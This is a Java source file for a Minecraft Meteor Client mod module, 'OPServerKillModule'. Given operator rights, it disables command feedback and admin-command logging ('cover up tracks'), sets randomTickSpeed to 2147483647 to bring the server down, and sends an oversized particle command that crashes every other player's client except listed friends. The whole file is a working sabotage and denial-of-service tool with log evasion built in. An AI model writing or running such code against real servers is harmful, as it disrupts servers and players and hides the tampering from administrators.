package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.friends.Friends;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.PlayerListEntry;
import pwn.noobs.trouserstreak.Trouser;
import pwn.noobs.trouserstreak.utils.PermissionUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class OPServerKillModule extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    public final Setting<Boolean> autoCompat = sgGeneral.add(new BoolSetting.Builder()
            .name("AutomatedCompatibility")
            .description("Makes the commands compatible for versions less than 1.21.11 automatically.")
            .defaultValue(true)
            .build()
    );
    public final Setting<Boolean> dontBeStupid = sgGeneral.add(new BoolSetting.Builder()
            .name("Restrict Singleplayer Use")
            .description("Does not allow you to screw up your singleplayer worlds. Turn off for 'testing' purposes.")
            .defaultValue(true)
            .build()
    );
    public final Setting<Boolean> notOP = sgGeneral.add(new BoolSetting.Builder()
            .name("Toggle Module if not OP")
            .description("Turn this off to prevent the bug of module always being turned off when you join server.")
            .defaultValue(false)
            .build()
    );
    private final Setting<Boolean> sendCommandFeedback = sgGeneral.add(new BoolSetting.Builder()
            .name("turn off sendCommandFeedback")
            .description("Makes commands invisible to other operators.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Boolean> logAdminCommands = sgGeneral.add(new BoolSetting.Builder()
            .name("turn off logAdminCommands")
            .description("Hides the kill command from console logs.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Boolean> crashOtherPlayers = sgGeneral.add(new BoolSetting.Builder()
            .name("crash-other-players")
            .description("Crashes everyone else's minecraft client. Don't forget to enable Anti Crash in Rejects!")
            .defaultValue(true)
            .build()
    );
    private final Setting<Boolean> nocrashfrend = sgGeneral.add(new BoolSetting.Builder()
            .name("dont-crash-friends")
            .description("Crashes everyone excluding your friends and you.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Integer> tickdelay = sgGeneral.add(new IntSetting.Builder()
            .name("Tick Delay")
            .description("The delay between commands sent.")
            .defaultValue(1)
            .min(0)
            .build()
    );
    private final Setting<Integer> killvalue = sgGeneral.add(new IntSetting.Builder()
            .name("randomTickSpeed (kill value)")
            .description("This is what kills server. Max value is best.")
            .defaultValue(2147483647)
            .min(0)
            .max(2147483647)
            .sliderRange(0, 2147483647)
            .build()
    );
    public OPServerKillModule() {
        super(Trouser.operator, "OPServerKillModule", "Runs a set of commands to disable a server. Requires OP. (ONLY USE IF YOU'RE 100% SURE)");
    }
    String serverVersion;
    private int ticks=0;
    private CopyOnWriteArrayList<PlayerListEntry> players;

    @Override
    public void onActivate() {
        if (mc.player == null || mc.world == null) return;
        if (dontBeStupid.get() && MinecraftClient.getInstance().isInSingleplayer()) {
            toggle();
            error("Don't break your single player world, it sucks.");
        }
        if (notOP.get() && PermissionUtils.getPermissionLevel(mc.player) < 2 && mc.world.isChunkLoaded(mc.player.getChunkPos().x, mc.player.getChunkPos().z)) {
            toggle();
            error("Must have permission level 2 or higher");
        }
        if (autoCompat.get()){
            if (mc.isIntegratedServerRunning()) {
                serverVersion = mc.getServer().getVersion();
            } else {
                serverVersion = mc.getCurrentServerEntry().version.getLiteralString();
            }
        }
        ticks=0;
    }

    @EventHandler
    public void onTick(TickEvent.Pre event) {
        ticks++;
        if (sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()){
            if (ticks == tickdelay.get()){ //prevent people from seeing the commands being executed
                sendCommandFeedback();
            }
            if (ticks == 2*tickdelay.get()){ //prevent console logging the command to cover up tracks
                logAdminCommands();
            }
            if (ticks == 3*tickdelay.get()){ //kill server
                randomTickSpeed();
            }
            if (ticks > 3*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()){
            if (ticks == tickdelay.get()){
                logAdminCommands();
            }
            if (ticks == 2*tickdelay.get()){
                randomTickSpeed();
            }
            if (ticks > 2*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()){
            if (ticks == tickdelay.get()){
                sendCommandFeedback();
            }
            if (ticks == 2*tickdelay.get()){
                randomTickSpeed();
            }
            if (ticks > 2*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (!sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()){
            if (ticks == tickdelay.get()){
                randomTickSpeed();
            }
            if (ticks > tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()){
            if (ticks == tickdelay.get()){
                logAdminCommands();
            }
            if (ticks == 2*tickdelay.get()){ //crash players
                if (mc.player == null) return;
                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
                else if (nocrashfrend.get()) {
                    players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
                    List<String> friendNames = new ArrayList<>();
                    friendNames.add("name=!" + mc.player.getName().getLiteralString());
                    for(PlayerListEntry player : players) {
                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().name());
                    }
                    String friendsString = String.join(",", friendNames);
                    String thecommand = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
                    if (thecommand.length()<=256){
                        ChatUtils.sendPlayerMsg(thecommand);
                    }
                    else {
                        error("Crash all players command is too long, you have too many friends online.");
                    }
                }
            }
            if (ticks == 3*tickdelay.get()){
                randomTickSpeed();
            }
            if (ticks > 3*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && crashOtherPlayers.get()){
            if (ticks == tickdelay.get()){ //prevent people from seeing the commands being executed
                sendCommandFeedback();
            }
            if (ticks == 2*tickdelay.get()){ //crash players
                if (mc.player == null) return;
                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
                else if (nocrashfrend.get()) {
                    players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
                    List<String> friendNames = new ArrayList<>();
                    friendNames.add("name=!" + mc.player.getName().getLiteralString());
                    for(PlayerListEntry player : players) {
                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().name());
                    }
                    String friendsString = String.join(",", friendNames);
                    String thecommand2 = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
                    if (thecommand2.length()<=256){
                        ChatUtils.sendPlayerMsg(thecommand2);
                    }
                    else {
                        error("Crash all players command is too long, you have too many friends online.");
                    }
                }
            }
            if (ticks == 3*tickdelay.get()){
                randomTickSpeed();
            }
            if (ticks > 3*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()){
            if (ticks == tickdelay.get()){ //prevent people from seeing the commands being executed
                sendCommandFeedback();
            }
            if (ticks == 2*tickdelay.get()){ //prevent console logging the command to cover up tracks
                logAdminCommands();
            }
            if (ticks == 3*tickdelay.get()){ //crash players
                if (mc.player == null) return;
                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
                else if (nocrashfrend.get()) {
                    players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
                    List<String> friendNames = new ArrayList<>();
                    friendNames.add("name=!" + mc.player.getName().getLiteralString());
                    for(PlayerListEntry player : players) {
                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().name());
                    }
                    String friendsString = String.join(",", friendNames);
                    String thecommand2 = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
                    if (thecommand2.length()<=256){
                        ChatUtils.sendPlayerMsg(thecommand2);
                    }
                    else {
                        error("Crash all players command is too long, you have too many friends online.");
                    }
                }
            }
            if (ticks == 4*tickdelay.get()){ //kill server
                randomTickSpeed();
            }
            if (ticks > 4*tickdelay.get()){ //kill server
                toggle();
                error("Server Killed.");
            }
        }
    }
    private void randomTickSpeed(){
        if (isVersionLessThan(serverVersion, 1, 21, 11)) {
            ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
        } else {
            ChatUtils.sendPlayerMsg("/gamerule random_tick_speed "+killvalue.get());
        }
    }
    private void sendCommandFeedback(){
        if (isVersionLessThan(serverVersion, 1, 21, 11)) {
            ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
        } else {
            ChatUtils.sendPlayerMsg("/gamerule send_command_feedback false");
        }
    }
    private void logAdminCommands(){
        if (isVersionLessThan(serverVersion, 1, 21, 11)) {
            ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
        } else {
            ChatUtils.sendPlayerMsg("/gamerule log_admin_commands false");
        }
    }
    private boolean isVersionLessThan(String serverVersion, int major, int minor, int patch) {
        if (serverVersion == null) return false;

        java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("(\\d+)\\.(\\d+)\\.(\\d+)");
        java.util.regex.Matcher matcher = pattern.matcher(serverVersion);

        if (matcher.find()) {
            try {
                int serverMajor = Integer.parseInt(matcher.group(1));
                int serverMinor = Integer.parseInt(matcher.group(2));
                int serverPatch = Integer.parseInt(matcher.group(3));

                if (serverMajor < major) return true;
                if (serverMajor > major) return false;

                if (serverMinor < minor) return true;
                if (serverMinor > minor) return false;

                return serverPatch < patch;

            } catch (NumberFormatException e) {
                return false;
            }
        }
        return false;
    }
}